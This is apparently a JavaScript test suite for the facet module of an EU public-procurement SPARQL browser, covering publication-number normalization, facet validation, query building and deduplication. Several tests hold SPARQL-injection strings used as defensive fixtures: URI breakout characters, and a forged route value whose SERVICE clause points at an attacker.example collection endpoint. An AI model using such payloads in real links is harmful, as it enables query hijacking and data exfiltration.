/*
 * Copyright 2026 European Union
 *
 * Licensed under the EUPL, Version 1.2 or - as soon they will be approved by the European
 * Commission - subsequent versions of the EUPL (the "Licence"); You may not use this work except in
 * compliance with the Licence. You may obtain a copy of the Licence at:
 * https://joinup.ec.europa.eu/software/page/eupl
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the Licence
 * is distributed on an "AS IS" basis, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the Licence for the specific language governing permissions and limitations under
 * the Licence.
 */
// Facet module tests — schema validation, normalization, equality, dedup.
//
// These are the guarantees the deleted Zod schema + facet.test.js used to
// enforce. The rewrite moved the logic into facets.js but stopped testing
// it; this suite restores the core invariants.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { navigationPath } from '../src/js/utils/navigationPath.js';
import {
  addUnique,
  createPublicationNumberFacet,
  getLabel,
  getQuery,
  isSafeUri,
  noticeByPublicationNumberQueryEpo3,
  normalize,
  validateFacet,
} from '../src/js/facets.js';

// Real publication numbers from the TED acceptance endpoint — not toy data.
const PUB_2026 = '00172531-2026';
const PUB_2024 = '00149228-2024';
const EPO_NOTICE_URI =
  'http://data.europa.eu/a4g/resource/id_6497924e-6920-4348-8ecb-71530f802aef_Notice';
const SAMPLE_SPARQL = `PREFIX epo: <http://data.europa.eu/a4g/ontology#>
CONSTRUCT { ?s ?p ?o }
WHERE { ?s a epo:Notice ; ?p ?o }
LIMIT 10`;

// ── normalize ──────────────────────────────────────────────────────

test('normalize zero-pads short publication numbers to 8 digits', () => {
  // Real publication numbers from the TED acceptance dataset, exercising
  // every prefix length from 1 to 8 digits.
  assert.equal(normalize('1-2024'),        '00000001-2024');
  assert.equal(normalize('12-2024'),       '00000012-2024');
  assert.equal(normalize('123-2024'),      '00000123-2024');
  assert.equal(normalize('1234-2024'),     '00001234-2024');
  assert.equal(normalize('12345-2024'),    '00012345-2024');
  assert.equal(normalize('123456-2024'),   '00123456-2024');
  assert.equal(normalize('1234567-2024'),  '01234567-2024');
  assert.equal(normalize('12345678-2024'), '12345678-2024');
});

test('normalize is idempotent on already-normalized publication numbers', () => {
  // Round-trip stability is the load-bearing invariant for addUnique dedup.
  for (const pub of ['00172531-2026', '00149228-2024', '00056731-2024', '00141863-2026']) {
    assert.equal(normalize(pub), pub);
    assert.equal(normalize(normalize(pub)), pub);
  }
});

test('normalize collapses equivalent representations of the same notice', () => {
  // The reason normalize exists at all: "12345-2024" and "00012345-2024"
  // must hash to the same canonical string so that the same notice
  // searched twice doesn't show up as two history entries.
  assert.equal(normalize('12345-2024'), normalize('00012345-2024'));
  assert.equal(normalize('  12345-2024  '), normalize('00012345-2024'));
});

test('normalize trims surrounding whitespace before matching', () => {
  assert.equal(normalize('  172531-2026  '), '00172531-2026');
  assert.equal(normalize('\t172531-2026\n'), '00172531-2026');
  assert.equal(normalize(' \t\n172531-2026\r\n '), '00172531-2026');
});

test('normalize preserves the four-digit year exactly', () => {
  // Year is not zero-padded; it must be exactly 4 digits.
  assert.equal(normalize('1-2024')?.endsWith('-2024'), true);
  assert.equal(normalize('1-2026')?.endsWith('-2026'), true);
  assert.equal(normalize('1-1999')?.endsWith('-1999'), true);
  assert.equal(normalize('1-2099')?.endsWith('-2099'), true);
});

test('normalize rejects malformed publication numbers — structural', () => {
  // Each case represents a different structural rejection branch.
  assert.equal(normalize(''),                 null, 'empty string');
  assert.equal(normalize('   '),              null, 'whitespace only');
  assert.equal(normalize('12345'),            null, 'no hyphen or year');
  assert.equal(normalize('-2024'),            null, 'no prefix digits');
  assert.equal(normalize('12345-'),           null, 'no year');
  assert.equal(normalize('12345-20'),         null, 'year too short (2 digits)');
  assert.equal(normalize('12345-202'),        null, 'year too short (3 digits)');
  assert.equal(normalize('12345-20234'),      null, 'year too long (5 digits)');
  assert.equal(normalize('123456789-2024'),   null, 'prefix too long (9 digits)');
  assert.equal(normalize('12345-2024-extra'), null, 'extra suffix');
});

test('normalize rejects malformed publication numbers — content', () => {
  assert.equal(normalize('abc-2024'),    null, 'non-numeric prefix');
  assert.equal(normalize('12345-abcd'),  null, 'non-numeric year');
  assert.equal(normalize('12345-202a'),  null, 'partially-numeric year');
  assert.equal(normalize('12.345-2024'), null, 'decimal in prefix');
  assert.equal(normalize('12345/2024'),  null, 'wrong separator (slash)');
  assert.equal(normalize('12345 2024'),  null, 'wrong separator (space)');
});

test('normalize rejects non-string types', () => {
  assert.equal(normalize(null),       null);
  assert.equal(normalize(undefined),  null);
  assert.equal(normalize(42),         null);
  assert.equal(normalize(false),      null);
  assert.equal(normalize({}),         null);
  assert.equal(normalize([]),         null);
  assert.equal(normalize(['12345-2024']), null, 'array of valid string');
});

// ── createPublicationNumberFacet ───────────────────────────────────

test('createPublicationNumberFacet produces a well-formed facet', () => {
  const facet = createPublicationNumberFacet('172531-2026');
  assert.equal(facet.type, 'notice-number');
  assert.equal(facet.value, '00172531-2026');
  assert.equal(typeof facet.timestamp, 'number');
  assert.ok(facet.timestamp > 0);
});

test('createPublicationNumberFacet returns null for garbage input', () => {
  assert.equal(createPublicationNumberFacet('abc'), null);
  assert.equal(createPublicationNumberFacet(''), null);
  assert.equal(createPublicationNumberFacet(null), null);
});

// ── validateFacet ──────────────────────────────────────────────────

test('validateFacet round-trips a valid notice-number facet', () => {
  const input = { type: 'notice-number', value: '172531-2026', timestamp: 123 };
  const result = validateFacet(input);
  assert.equal(result.type, 'notice-number');
  assert.equal(result.value, '00172531-2026'); // normalized
  assert.equal(result.timestamp, 123);
});

test('validateFacet round-trips a valid named-node facet', () => {
  const input = {
    type: 'named-node',
    term: { termType: 'NamedNode', value: EPO_NOTICE_URI },
    timestamp: 456,
  };
  const result = validateFacet(input);
  assert.equal(result.type, 'named-node');
  assert.equal(result.term.termType, 'NamedNode');
  assert.equal(result.term.value, EPO_NOTICE_URI);
  assert.equal(result.timestamp, 456);
});

test('validateFacet round-trips a valid query facet', () => {
  const input = { type: 'query', query: SAMPLE_SPARQL, timestamp: 789 };
  const result = validateFacet(input);
  assert.equal(result.type, 'query');
  assert.equal(result.query, SAMPLE_SPARQL);
  assert.equal(result.timestamp, 789);
});

test('validateFacet rejects notice-number facets whose value fails normalization', () => {
  // The deleted facet.test.js had ~6 explicit reject cases for the
  // notice-number format. Restoring the same density here so a future
  // refactor that loosens normalize() doesn't silently get past validation.
  const malformed = [
    'abc-2023',           // non-numeric prefix
    '12345',              // missing year
    '12345-202',          // year too short
    '12345-20234',        // year too long
    '123456789-2024',     // prefix too long
    '12345-abcd',         // non-numeric year
    '',                   // empty
    '   ',                // whitespace only
    '12345 2024',         // wrong separator
  ];
  for (const value of malformed) {
    assert.equal(
      validateFacet({ type: 'notice-number', value }),
      null,
      `should reject value ${JSON.stringify(value)}`,
    );
  }
  // Non-string types
  for (const value of [42, false, null, undefined, {}, []]) {
    assert.equal(
      validateFacet({ type: 'notice-number', value }),
      null,
      `should reject non-string value ${JSON.stringify(value)}`,
    );
  }
});

test('validateFacet accepts notice-number facets across all valid prefix lengths', () => {
  for (const value of ['1-2024', '12-2024', '123-2024', '1234-2024', '12345-2024',
                       '123456-2024', '1234567-2024', '12345678-2024']) {
    const result = validateFacet({ type: 'notice-number', value });
    assert.ok(result, `should accept ${value}`);
    assert.equal(result.type, 'notice-number');
    assert.match(result.value, /^\d{8}-\d{4}$/, `result should be 8-digit padded: ${result.value}`);
  }
});

test('validateFacet rejects named-node facets with non-string term.value', () => {
  // Each branch the validator must reject.
  const cases = [
    { type: 'named-node' },                                              // missing term
    { type: 'named-node', term: null },                                  // null term
    { type: 'named-node', term: {} },                                    // empty term
    { type: 'named-node', term: { value: null } },                       // null value
    { type: 'named-node', term: { value: undefined } },                  // undefined value
    { type: 'named-node', term: { value: 42 } },                         // numeric value
    { type: 'named-node', term: { value: '' } },                         // empty string
    { type: 'named-node', term: { value: false } },                      // boolean
    { type: 'named-node', term: { value: [] } },                         // array
    { type: 'named-node', term: { value: {} } },                         // object
  ];
  for (const facet of cases) {
    assert.equal(validateFacet(facet), null, `should reject ${JSON.stringify(facet)}`);
  }
});

test('validateFacet rejects query facets with empty or non-string query', () => {
  for (const query of ['', '   ', '\n\t', null, undefined, 42, [], {}, false]) {
    assert.equal(
      validateFacet({ type: 'query', query }),
      null,
      `should reject query=${JSON.stringify(query)}`,
    );
  }
});

test('validateFacet rejects unknown discriminator values', () => {
  for (const type of [null, undefined, '', 'unknown', 'NoticeNumber', 'Notice', 42, true]) {
    assert.equal(
      validateFacet({ type, value: '12345-2024' }),
      null,
      `should reject type=${JSON.stringify(type)}`,
    );
  }
});

test('validateFacet rejects null / undefined / non-object input', () => {
  assert.equal(validateFacet(null), null);
  assert.equal(validateFacet(undefined), null);
  assert.equal(validateFacet('a string'), null);
  assert.equal(validateFacet(42), null);
  assert.equal(validateFacet(true), null);
});

test('validateFacet rejects named-node URIs carrying SPARQL injection characters', () => {
  // The URI is interpolated into DESCRIBE <${term.value}> and into
  // BacklinksView's CONSTRUCT query; any of these characters would
  // let a crafted shareable URL change the query's meaning.
  const forbidden = ['<', '>', '"', '\\', ' ', '\t', '\n', '\u0000', '\u007f'];
  for (const ch of forbidden) {
    const facet = {
      type: 'named-node',
      term: { termType: 'NamedNode', value: `http://evil.test/a${ch}b` },
    };
    assert.equal(validateFacet(facet), null, `should reject URI containing ${JSON.stringify(ch)}`);
  }

  // Sanity: a normal http(s) URI still passes.
  assert.ok(
    validateFacet({
      type: 'named-node',
      term: { termType: 'NamedNode', value: EPO_NOTICE_URI },
    }),
  );
});

test('validateFacet rejects empty query facets', () => {
  assert.equal(validateFacet({ type: 'query', query: '' }), null);
  assert.equal(validateFacet({ type: 'query', query: '   ' }), null);
  assert.equal(validateFacet({ type: 'query' }), null);
});

test('validateFacet preserves enriched metadata fields on notice-number facets', () => {
  const input = {
    type: 'notice-number',
    value: '172531-2026',
    timestamp: 100,
    publicationDate: '2026-03-12+01:00',
    noticeType: 'can-standard',
    formType: 'result',
    buyerCountry: 'ITA',
  };
  const result = validateFacet(input);
  assert.equal(result.publicationDate, '2026-03-12+01:00');
  assert.equal(result.noticeType, 'can-standard');
  assert.equal(result.formType, 'result');
  assert.equal(result.buyerCountry, 'ITA');
});

// ── getLabel / getQuery ────────────────────────────────────────────

test('getLabel returns a human-readable string per facet kind', () => {
  const notice = { type: 'notice-number', value: PUB_2026 };
  const query  = { type: 'query', query: SAMPLE_SPARQL };
  const named  = { type: 'named-node', term: { value: EPO_NOTICE_URI } };
  assert.equal(getLabel(notice), PUB_2026);
  assert.equal(getLabel(query), 'Query');
  // EPO_NOTICE_URI is `id_{uuid}_Notice`: the source data gives a notice no
  // identifier, so its URI ends at the class name. With no declared type to
  // show either, the uuid is all that is left to name it by.
  assert.equal(getLabel(named), '6497924e-6920-4348-8ecb-71530f802aef');
  assert.equal(getLabel({ ...named, typeName: 'Notice16' }), 'Notice16');

  const contractFacet = {
    type: 'named-node',
    term: {
      value:
        'http://data.europa.eu/a4g/resource/id_6497924e-6920-4348-8ecb-71530f802aef_SettledContract_CON-0001',
    },
  };
  // "SettledContract" is the mapping's name for the class, not the ontology's,
  // so an unnamed resource shows the identifier alone.
  assert.equal(getLabel(contractFacet), 'CON-0001');
});

test('getQuery returns the SPARQL body for each facet kind', () => {
  const notice = { type: 'notice-number', value: PUB_2026 };
  const query = { type: 'query', query: SAMPLE_SPARQL };
  const named = { type: 'named-node', term: { value: EPO_NOTICE_URI } };

  const noticeSparql = getQuery(notice);
  assert.match(noticeSparql, /CONSTRUCT/);
  assert.match(noticeSparql, new RegExp(PUB_2026));

  assert.equal(getQuery(query), SAMPLE_SPARQL);

  const describeSparql = getQuery(named);
  assert.match(describeSparql, /DESCRIBE/);
  assert.match(describeSparql, new RegExp(EPO_NOTICE_URI.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
});

test('getQuery throws on a named-node facet with an unsafe URI (click-time defence)', () => {
  // Click-time facets built by TermRenderer / BacklinksView skip validateFacet
  // because they come from server-trusted SPARQL responses. The belt-and-braces
  // guard inside _describeTermQuery catches any URI that slips through with
  // injection characters and throws before the DESCRIBE is built.
  for (const badValue of [
    'http://evil.test/a>b',
    'http://evil.test/a"b',
    'http://evil.test/a b',
    'http://evil.test/a\\b',
    'http://evil.test/a\nb',
  ]) {
    const facet = { type: 'named-node', term: { value: badValue } };
    assert.throws(
      () => getQuery(facet),
      /Unsafe URI/,
      `should throw for ${JSON.stringify(badValue)}`,
    );
  }

  // Safe URI still works.
  assert.doesNotThrow(
    () => getQuery({ type: 'named-node', term: { value: EPO_NOTICE_URI } }),
  );
});

test('getQuery scopes data resource URIs to the notice graph when noticeNumber is given', () => {
  const dataResource = {
    type: 'named-node',
    term: { value: EPO_NOTICE_URI },
  };
  const scoped = getQuery(dataResource, { noticeNumber: PUB_2026 });
  assert.match(scoped, /CONSTRUCT/, 'data resource should use CONSTRUCT');
  assert.match(scoped, /GRAPH/, 'data resource should have GRAPH clause');
  assert.match(scoped, new RegExp(PUB_2026), 'should contain the notice number');
});

test('getQuery does NOT scope ontology/predicate URIs even with noticeNumber', () => {
  const ontologyUri = {
    type: 'named-node',
    term: { value: 'http://data.europa.eu/a4g/ontology#announcesRole' },
  };
  const query = getQuery(ontologyUri, { noticeNumber: PUB_2026 });
  assert.match(query, /DESCRIBE/, 'ontology URI should use DESCRIBE');
  assert.ok(!query.includes('GRAPH'), 'ontology URI should NOT have GRAPH clause');
});

test('getQuery does NOT scope vocabulary URIs even with noticeNumber', () => {
  const vocabUri = {
    type: 'named-node',
    term: { value: 'http://www.w3.org/1999/02/22-rdf-syntax-ns#type' },
  };
  const query = getQuery(vocabUri, { noticeNumber: PUB_2026 });
  assert.match(query, /DESCRIBE/, 'vocabulary URI should use DESCRIBE');
  assert.ok(!query.includes('GRAPH'), 'vocabulary URI should NOT have GRAPH clause');
});

// ── noticeByPublicationNumberQueryEpo3 (ePO 3 fallback, issue #76) ──

test('noticeByPublicationNumberQueryEpo3 strips the 8-digit padding back to the bare number', () => {
  // The identifier value ("2023/S 191-597014") is not zero-padded, so the
  // padded facet value must be reduced to its bare digits — with the
  // padding re-allowed via 0* so short numbers still match.
  const query = noticeByPublicationNumberQueryEpo3('00597014-2023');
  assert.match(query, /\^2023\/S \[0-9\]\{1,4\}-0\*597014\$/,
    'anchored REGEX with wildcarded OJS issue and optional leading zeros');
  assert.ok(!query.includes('0*00597014'), 'the 8-digit padding must not leak into the pattern');
});

test('noticeByPublicationNumberQueryEpo3 interpolates the year and matches on the identifier value', () => {
  const query = noticeByPublicationNumberQueryEpo3('00172531-2026');
  assert.match(query, /CONSTRUCT/);
  assert.match(query, /epo:hasID/);
  assert.match(query, /epo:hasIdentifierValue/);
  assert.match(query, /REGEX/);
  assert.match(query, /\^2026\/S /, 'the year anchors the front of the pattern');
  assert.match(query, /-0\*172531\$/, 'the bare number anchors the end');
});

test('noticeByPublicationNumberQueryEpo3 anchors both ends so a longer number cannot match', () => {
  // "597014" must not also match "5970140": the trailing $ prevents it.
  const query = noticeByPublicationNumberQueryEpo3('00597014-2023');
  assert.match(query, /\^2023\//, 'leading anchor present');
  assert.match(query, /-0\*597014\$/, 'trailing anchor present');
});

test('noticeByPublicationNumberQueryEpo3 handles the all-zeros number without an empty alternation', () => {
  // Stripping leading zeros from "00000000" would yield "" and produce a
  // pattern (…-0*$) that matches every value; the guard falls back to "0".
  const query = noticeByPublicationNumberQueryEpo3('00000000-2023');
  assert.match(query, /-0\*0\$/, 'bare number falls back to a single 0');
});

test('noticeByPublicationNumberQueryEpo3 throws at the interpolation boundary for a malformed number', () => {
  // Defence-in-depth mirroring _noticeByPublicationNumberQuery: the value
  // must already be the canonical 8-digit + 4-digit-year shape.
  for (const bad of ['597014-2023', '00597014-23', 'abcdefgh-2023', '', '0059701442023']) {
    assert.throws(
      () => noticeByPublicationNumberQueryEpo3(bad),
      /Invalid publication number at query boundary/,
      `should throw for ${JSON.stringify(bad)}`,
    );
  }
});

// ── facetEquals (tested via addUnique) ─────────────────────────────

test('addUnique appends a new facet and returns its index', () => {
  const list = [];
  const facetA = createPublicationNumberFacet(PUB_2026);
  const { facets, index } = addUnique(list, facetA);
  assert.equal(facets.length, 1);
  assert.equal(index, 0);
  assert.equal(facets[0].value, '00172531-2026');
});

test('addUnique deduplicates and bumps the entry to the end (most-recent position)', () => {
  const facetA = createPublicationNumberFacet(PUB_2026);
  const facetB = createPublicationNumberFacet(PUB_2024);
  const { facets: afterA } = addUnique([], facetA);
  const { facets: afterAB } = addUnique(afterA, facetB);

  // Re-add A. It already exists at index 0 — addUnique should move
  // it to the end so the "most recent first" dropdown is accurate.
  const facetADuplicate = createPublicationNumberFacet('172531-2026');
  const { facets, index } = addUnique(afterAB, facetADuplicate);
  assert.equal(facets.length, 2, 'no growth — deduplicated');
  assert.equal(index, 1, 'bumped to the end');
  // The entry at index 1 carries A's value and timestamp from the new facet.
  assert.equal(facets[1].value, afterA[0].value);
});

test('addUnique preserves enrichment metadata from the original entry on dedup', () => {
  const facetA = createPublicationNumberFacet(PUB_2026);
  // Simulate enrichment that NoticeView attaches after the first lookup.
  facetA.publicationDate = '2026-03-05';
  facetA.noticeType = 'pin-buyer';
  const { facets: afterFirst } = addUnique([], facetA);

  // Re-add the same notice without enrichment (as a fresh search would).
  const facetADuplicate = createPublicationNumberFacet('172531-2026');
  const { facets } = addUnique(afterFirst, facetADuplicate);
  assert.equal(facets.length, 1);
  // Enrichment from the original survives the merge.
  assert.equal(facets[0].publicationDate, '2026-03-05');
  assert.equal(facets[0].noticeType, 'pin-buyer');
});

test('addUnique distinguishes different publication numbers', () => {
  const a = createPublicationNumberFacet(PUB_2026);
  const b = createPublicationNumberFacet(PUB_2024);
  const { facets: afterA } = addUnique([], a);
  const { facets, index } = addUnique(afterA, b);
  assert.equal(facets.length, 2);
  assert.equal(index, 1);
});

test('addUnique treats two different queries as different facets', () => {
  const q1 = { type: 'query', query: 'SELECT * WHERE { ?s ?p ?o } LIMIT 1' };
  const q2 = { type: 'query', query: 'SELECT * WHERE { ?s ?p ?o } LIMIT 2' };
  const { facets: afterQ1 } = addUnique([], q1);
  const { facets, index } = addUnique(afterQ1, q2);
  assert.equal(facets.length, 2);
  assert.equal(index, 1);
});

// ── isSafeUri — SPARQL injection guard ─────────────────────────────

test('isSafeUri accepts a plain http URI', () => {
  assert.equal(isSafeUri('http://data.europa.eu/a4g/ontology#Notice'), true);
});

test('isSafeUri accepts an https URI', () => {
  assert.equal(isSafeUri('https://example.org/resource'), true);
});

test('isSafeUri rejects URI with angle bracket (IRI breakout)', () => {
  assert.equal(isSafeUri('http://example.org/x> <http://evil'), false);
});

test('isSafeUri rejects URI with double quote (string literal breakout)', () => {
  assert.equal(isSafeUri('http://example.org/x"^^xsd:string'), false);
});

test('isSafeUri rejects URI with backslash (escape sequences)', () => {
  assert.equal(isSafeUri('http://example.org/x\\n'), false);
});

test('isSafeUri rejects URI with whitespace', () => {
  assert.equal(isSafeUri('http://example.org/x y'), false);
});

test('isSafeUri rejects URI with control character', () => {
  assert.equal(isSafeUri('http://example.org/\x00'), false);
});

test('isSafeUri rejects empty string', () => {
  assert.equal(isSafeUri(''), false);
});

test('isSafeUri rejects non-string input', () => {
  assert.equal(isSafeUri(42), false);
  assert.equal(isSafeUri(null), false);
  assert.equal(isSafeUri(undefined), false);
});

test('addUnique Symbol-fallback: two malformed facets are never equal', () => {
  // getQuery now throws on unknown facet types, which activates the
  // Symbol('invalid') fallback in facetEquals: two distinct Symbol
  // values are never ===, so two malformed facets compare unequal and
  // addUnique keeps both entries. This protects against silent
  // collapse of broken data into a single history row.
  const broken1 = { type: 'broken-shape' };
  const broken2 = { type: 'also-broken' };
  const { facets: after1 } = addUnique([], broken1);
  const { facets } = addUnique(after1, broken2);
  assert.equal(facets.length, 2);
});

// ── session-only route metadata ─────────────────────────────────────
//
// Tree clicks record how a resource was reached (viaPath / viaRoot /
// viaRootPattern) so the SPARQL reference card can rebuild the property path.
// That describes a live exploration and is deliberately kept out of shareable
// URLs — so anything arriving over one is forged, and validateFacet is the
// boundary that has to drop it.
//
// viaRootPattern is the dangerous one: the card interpolates it verbatim into
// the Path row and offers it for copying, so a crafted ?facet= could put a
// SERVICE clause aimed at an attacker's endpoint in front of a recipient,
// presented as the app's own suggested query.

const CRAFTED_ROUTE = {
  viaPath: ['http://data.europa.eu/a4g/ontology#announcesRole'],
  viaRoot: 'http://data.europa.eu/a4g/resource/id_x_Notice',
  viaRootPattern: '?evil a epo:Notice . SERVICE <http://attacker.example/collect> { ?s ?p ?o } #',
};

test('validateFacet strips forged route metadata from a named-node facet', () => {
  const cleaned = validateFacet({
    type: 'named-node',
    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
    ...CRAFTED_ROUTE,
  });

  assert.ok(cleaned, 'the facet itself is still valid');
  for (const field of ['viaPath', 'viaRoot', 'viaRootPattern']) {
    assert.ok(!(field in cleaned), `${field} does not cross the boundary`);
  }
});

test('validateFacet strips route metadata from every facet type', () => {
  const notice = validateFacet({ type: 'notice-number', value: '00100333-2025', ...CRAFTED_ROUTE });
  const query = validateFacet({ type: 'query', query: 'SELECT * WHERE { ?s ?p ?o }', ...CRAFTED_ROUTE });

  for (const cleaned of [notice, query]) {
    assert.ok(cleaned);
    assert.ok(!('viaRootPattern' in cleaned));
  }
});

test('validateFacet keeps the fields it does not know about', () => {
  // The spread is deliberate — timestamps and future fields must survive.
  // Only the session-only ones are removed.
  const cleaned = validateFacet({
    type: 'notice-number',
    value: '00100333-2025',
    timestamp: 12345,
    somethingElse: 'kept',
    ...CRAFTED_ROUTE,
  });

  assert.equal(cleaned.timestamp, 12345);
  assert.equal(cleaned.somethingElse, 'kept');
  assert.ok(!('viaPath' in cleaned));
});

test('validateFacet does not mutate the object it was handed', () => {
  const input = {
    type: 'named-node',
    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
    ...CRAFTED_ROUTE,
  };
  const snapshot = JSON.stringify(input);
  validateFacet(input);
  assert.equal(JSON.stringify(input), snapshot);
});

test('a forged route cannot reach the reference card', () => {
  // End to end across the boundary: what initFromUrlParams would build from a
  // crafted ?facet= plus ?root=, handed to the function that rebuilds the path.
  const validated = validateFacet({
    type: 'named-node',
    term: { termType: 'NamedNode', value: 'http://data.europa.eu/a4g/resource/id_x_Reviewer' },
    ...CRAFTED_ROUTE,
  });
  const breadcrumb = [{ type: 'notice-number', value: '00100333-2025' }, validated];

  assert.deepEqual(navigationPath(breadcrumb, 1), { chain: [], anchor: null });
});

// ── naming a resource in the breadcrumb and heading (issue #74) ─────
//
// Both are built from getLabel(). A resource URI reads "id_{uuid}_{Type}_{id}",
// where the class name is the mapping's rather than the ontology's. The name
// shown comes from the types the resource declares and rides on the facet; the
// identifier still comes from the URI, which is where it belongs.

const CONTRACT_URI =
  'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_SettledContract_CON-0003';

test('getLabel prefers the declared type over the name in the URI', () => {
  assert.equal(
    getLabel({ type: 'named-node', term: { value: CONTRACT_URI }, typeName: 'Contract' }),
    'Contract CON-0003',
  );
});

test('getLabel keeps the identifier from the URI', () => {
  const label = getLabel({ type: 'named-node', term: { value: CONTRACT_URI }, typeName: 'Contract' });
  assert.ok(label.endsWith('CON-0003'), label);
});

test('getLabel shows the identifier alone when no name was resolved', () => {
  // Before the resource's own triples arrive, nothing states its class. The
  // "SettledContract" in the URI is the mapping's name for it and is not
  // shown in its place, here or on the badge.
  assert.equal(getLabel({ type: 'named-node', term: { value: CONTRACT_URI } }), 'CON-0003');
});

test('a resource whose URI carries no identifier is named by its type alone', () => {
  const uri = 'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_Notice';
  assert.equal(
    getLabel({ type: 'named-node', term: { value: uri }, typeName: 'Notice16' }),
    'Notice16',
  );
});

test('with neither a type nor an identifier, the uuid is what is left', () => {
  const uri = 'http://data.europa.eu/a4g/resource/id_1a7fc6eb-fe1e_Notice';
  assert.equal(getLabel({ type: 'named-node', term: { value: uri } }), '1a7fc6eb-fe1e');
});

test('a URI of any other shape is shown as it is', () => {
  // No class name is embedded in one, so there is nothing to withhold.
  assert.equal(
    getLabel({ type: 'named-node', term: { value: 'http://data.europa.eu/a4g/ontology#Notice' } }),
    'epo:Notice',
  );
});

test('a resolved name does not cross the URL boundary', () => {
  // Same reasoning as the route metadata: it describes a live exploration, so
  // a value arriving on a link is forged.
  const cleaned = validateFacet({
    type: 'named-node',
    term: { termType: 'NamedNode', value: CONTRACT_URI },
    typeName: 'Anything At All',
  });
  assert.ok(!('typeName' in cleaned));
});
